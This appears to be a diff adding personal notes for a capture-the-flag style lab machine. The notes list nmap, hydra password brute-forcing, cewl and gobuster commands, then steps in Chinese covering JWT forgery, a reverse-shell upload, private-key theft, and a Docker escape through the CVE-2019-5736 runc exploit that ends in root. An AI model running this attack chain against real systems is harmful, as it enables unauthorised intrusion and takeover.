@@ -1,0 +1,30 @@
+nmap 10.129.160.176 -sV -sC -Pn > nmap.txt
+
+
+hydra  -P /usr/share/wordlists/rockyou.txt 10.129.160.176 http-post-form "/login:username=admin&password=^PASS^:Login Failed! Reason: Incorrect Password"
+hydra  -P /usr/share/wordlists/rockyou.txt 10.129.153.255 http-post-form "/admin/index.php?login:pw=^PASS^:Wrong password!"
+
+
+cewl http://10.129.160.176/ > passlist
+gobuster dir  -u http://10.129.160.176/ -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+
+
+
+1.nmap掃描出80端口可以註冊帳號,登入後會返回auth的hash
+2.將hash做base64 解密
+jwt使用.分隔成三段,header,payload,secret
+3.安裝pyjwt生成token
+4.burp設置將cookie替換成token
+5.上傳reverse.php後取得reverse shell
+6.在/var/backup下找到noah的私鑰
+7.登入noah發現有sudo權限
+(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+8.上網搜索Docker container escape vulnerabilities,可以找到漏洞
+https://github.com/Frichetten/CVE-2019-5736-PoC
+9.修改main.go內的var payload後生成main
+go build main.go
+10.上傳到victim內的container,給予執行權限
+11.container執行./main overwrite /bin/sh
+12.host執行sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+13.本機kali listen取得reverse root
+注意該漏洞over write一次之後就不可在使用,須重製機器才可以
